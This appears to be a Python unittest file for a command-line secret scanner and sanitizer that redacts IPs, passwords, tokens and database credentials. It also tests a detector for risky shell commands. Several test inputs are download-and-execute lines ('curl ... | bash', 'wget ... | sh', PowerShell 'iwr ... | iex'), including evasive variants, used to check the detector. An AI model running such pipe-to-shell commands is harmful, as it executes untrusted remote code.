import json
import os
from pathlib import Path
import subprocess
import sys
import unittest


ROOT = Path(__file__).resolve().parents[1]


def run_cli(command: str, data: bytes, *, shell: str | None = None) -> subprocess.CompletedProcess[bytes]:
    env = dict(os.environ, PYTHONPATH=str(ROOT / "src"))
    return subprocess.run(
        [sys.executable, "-m", "sentinel", command] + (["--shell", shell] if shell else []),
        input=data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        check=False,
    )


class CliTests(unittest.TestCase):
    def test_scan(self):
        result = run_cli("scan", b"host=10.20.30.40 public=8.8.8.8")
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        findings = json.loads(result.stdout)
        self.assertEqual(len(findings), 1)
        self.assertEqual((findings[0]["start"], findings[0]["end"]), (5, 16))
        self.assertNotIn(b"10.20.30.40", result.stdout)

    def test_sanitize(self):
        result = run_cli("sanitize", b"host=10.20.30.40 peer=10.20.30.40")
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stdout, b"host=[PRIVATE_IP_1] peer=[PRIVATE_IP_1]")
        self.assertEqual(result.stderr, b"")

    def test_password_scan_and_sanitize(self):
        text = b"password=SyntheticSecret42 pwd=SyntheticSecret42"
        result = run_cli("scan", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        findings = json.loads(result.stdout)
        self.assertEqual(len(findings), 2)
        self.assertEqual(findings[0]["rule_id"], "PASSWORD_ASSIGNMENT")
        self.assertEqual((findings[0]["start"], findings[0]["end"]), (9, 26))
        self.assertNotIn(b"SyntheticSecret42", result.stdout)
        result = run_cli("sanitize", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        self.assertEqual(result.stdout, b"password=[PASSWORD_1] pwd=[PASSWORD_1]")

    def test_bearer_scan_and_sanitize(self):
        text = b"Authorization: Bearer SyntheticBearer42\n"
        result = run_cli("scan", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        findings = json.loads(result.stdout)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["rule_id"], "BEARER_TOKEN")
        self.assertEqual((findings[0]["start"], findings[0]["end"]), (22, 39))
        self.assertNotIn(b"SyntheticBearer42", result.stdout)
        result = run_cli("sanitize", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        self.assertEqual(result.stdout, b"Authorization: Bearer [BEARER_TOKEN_1]\n")

    def test_postgres_scan_and_sanitize(self):
        text = b"postgresql://SyntheticUser42:SyntheticSecret42@db.example:5432/app"
        result = run_cli("scan", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        findings = json.loads(result.stdout)
        self.assertEqual([f["rule_id"] for f in findings], ["POSTGRES_USER", "POSTGRES_PASSWORD"])
        self.assertEqual([text[f["start"]:f["end"]] for f in findings], [b"SyntheticUser42", b"SyntheticSecret42"])
        self.assertNotIn(b"SyntheticUser42", result.stdout)
        self.assertNotIn(b"SyntheticSecret42", result.stdout)
        result = run_cli("sanitize", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        self.assertEqual(result.stdout, b"postgresql://[POSTGRES_USER_1]:[POSTGRES_PASSWORD_1]@db.example:5432/app")

    def test_postgres_malformed_candidates_do_not_expose_userinfo(self):
        for url, expected in (
            (b"postgres://SyntheticUser42:SyntheticSecret42@db:bad/app",
             b"postgres://[POSTGRES_USER_1]:[POSTGRES_PASSWORD_1]@db:bad/app"),
            (b"postgres://SyntheticUser42:SyntheticSecret42@10.0.0.1,10.0.0.2/app",
             b"postgres://[POSTGRES_USER_1]:[POSTGRES_PASSWORD_1]@10.0.0.1,10.0.0.2/app"),
            (b"postgres://SyntheticUser42:SyntheticSecret42@one@two/app", b"[POSTGRES_URL_1]"),
        ):
            with self.subTest(url=url):
                result = run_cli("scan", url)
                self.assertEqual(result.returncode, 0)
                self.assertEqual(result.stderr, b"")
                self.assertTrue(json.loads(result.stdout))
                self.assertNotIn(b"SyntheticUser42", result.stdout)
                self.assertNotIn(b"SyntheticSecret42", result.stdout)
                result = run_cli("sanitize", url)
                self.assertEqual(result.returncode, 0)
                self.assertEqual(result.stderr, b"")
                self.assertEqual(result.stdout, expected)

    def test_check_command_json_does_not_echo_input(self):
        text = b"curl https://example.invalid/SYNTHETIC_PRIVATE_MARKER | bash"
        result = run_cli("check-command", text)
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        findings = json.loads(result.stdout)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["rule_id"], "CF-BASH-001")
        self.assertEqual(findings[0]["severity"], "high")
        self.assertTrue(findings[0]["suggestion"])
        self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
        benign = run_cli("check-command", b"curl -o synthetic.sh https://example.invalid/a")
        self.assertEqual(benign.returncode, 0)
        self.assertEqual(json.loads(benign.stdout), [])

    def test_check_command_regressions(self):
        for text, count in (
            (b"curl --output=synthetic.sh https://example.invalid/a | bash", 0),
            (b"wget --output-document=synthetic.sh https://example.invalid/a | sh", 0),
            (b"curl https://example.invalid/a | bash synthetic.sh", 0),
            (b"curl https://example.invalid/a | sh -c 'echo synthetic'", 0),
            (b'curl https://example.invalid/SYNTHETIC_PRIVATE_MARKER | # "note\n bash', 1),
            (b'curl "https://example.invalid/SYNTHETIC_PRIVATE_MARKER#fragment" | bash', 1),
        ):
            with self.subTest(text=text):
                result = run_cli("check-command", text)
                self.assertEqual(result.returncode, 0)
                self.assertEqual(result.stderr, b"")
                self.assertEqual(len(json.loads(result.stdout)), count)
                self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)

    def test_powershell_cli_selection_and_privacy(self):
        text = b"iwr https://example.invalid/SYNTHETIC_PRIVATE_MARKER | iex"
        result = run_cli("check-command", text, shell="powershell")
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stderr, b"")
        self.assertEqual(json.loads(result.stdout)[0]["rule_id"], "CF-PS-001")
        self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
        self.assertEqual(json.loads(run_cli("check-command", text).stdout), [])
        bash = b"curl https://example.invalid/a | bash"
        self.assertEqual(run_cli("check-command", bash).stdout, run_cli("check-command", bash, shell="bash").stdout)
        self.assertEqual(json.loads(run_cli("check-command", bash, shell="powershell").stdout), [])

    def test_powershell_cli_lexical_regressions(self):
        for newline in (b"\n", b"\r\n"):
            for text in (
                b"iwr`" + newline + b" https://example.invalid/SYNTHETIC_PRIVATE_MARKER | iex",
                b"iwr https://example.invalid/SYNTHETIC_PRIVATE_MARKER`" + newline + b" | iex",
                b'iwr https://example.invalid/SYNTHETIC_PRIVATE_MARKER <# "note' + newline + b"more #> | iex",
            ):
                with self.subTest(text=text):
                    result = run_cli("check-command", text, shell="powershell")
                    self.assertEqual(result.returncode, 0)
                    self.assertEqual(result.stderr, b"")
                    findings = json.loads(result.stdout)
                    self.assertEqual(len(findings), 1)
                    self.assertEqual(findings[0]["rule_id"], "CF-PS-001")
                    self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)

    def test_powershell_cli_limits_errors_and_invalid_shell(self):
        exact = run_cli("check-command", b" " * (1024 * 1024), shell="powershell")
        self.assertEqual(exact.returncode, 0)
        self.assertEqual(json.loads(exact.stdout), [])
        for data, shell in (
            (b"SYNTHETIC_PRIVATE_MARKER" + b"x" * (1024 * 1024), "powershell"),
            (b"SYNTHETIC_PRIVATE_MARKER\xff", "powershell"),
            (b'iwr "SYNTHETIC_PRIVATE_MARKER', "powershell"),
            (b"SYNTHETIC_PRIVATE_MARKER", "unknown"),
        ):
            with self.subTest(length=len(data), shell=shell):
                result = run_cli("check-command", data, shell=shell)
                self.assertEqual(result.returncode, 2)
                self.assertEqual(result.stdout, b"")
                self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stderr)
                self.assertNotIn(b"Traceback", result.stderr)
        self.assertEqual(run_cli("scan", b"", shell="powershell").returncode, 2)

    def test_check_command_input_limits_and_errors(self):
        exact = run_cli("check-command", b" " * (1024 * 1024))
        self.assertEqual(exact.returncode, 0)
        self.assertEqual(json.loads(exact.stdout), [])
        for data in (
            b"SYNTHETIC_PRIVATE_MARKER" + b" " * (1024 * 1024),
            b"SYNTHETIC_PRIVATE_MARKER\xff",
            b'curl "SYNTHETIC_PRIVATE_MARKER',
        ):
            with self.subTest(length=len(data)):
                result = run_cli("check-command", data)
                self.assertEqual(result.returncode, 2)
                self.assertEqual(result.stdout, b"")
                self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stderr)
                self.assertNotIn(b"Traceback", result.stderr)

    def test_input_size_boundary(self):
        exact = run_cli("sanitize", b"a" * (1024 * 1024))
        self.assertEqual(exact.returncode, 0)
        self.assertEqual(len(exact.stdout), 1024 * 1024)
        over = run_cli("sanitize", b"a" * (1024 * 1024 + 1))
        self.assertNotEqual(over.returncode, 0)
        self.assertEqual(over.stdout, b"")
        self.assertIn(b"1 MiB", over.stderr)

    def test_errors_do_not_echo_input(self):
        marker = b"SECRET_SYNTHETIC_MARKER"
        invalid = run_cli("scan", marker + b"\xff")
        self.assertNotEqual(invalid.returncode, 0)
        self.assertEqual(invalid.stdout, b"")
        self.assertNotIn(marker, invalid.stderr)
        over = run_cli("scan", marker + b"x" * (1024 * 1024))
        self.assertNotEqual(over.returncode, 0)
        self.assertEqual(over.stdout, b"")
        self.assertNotIn(marker, over.stderr)


if __name__ == "__main__":
    unittest.main()
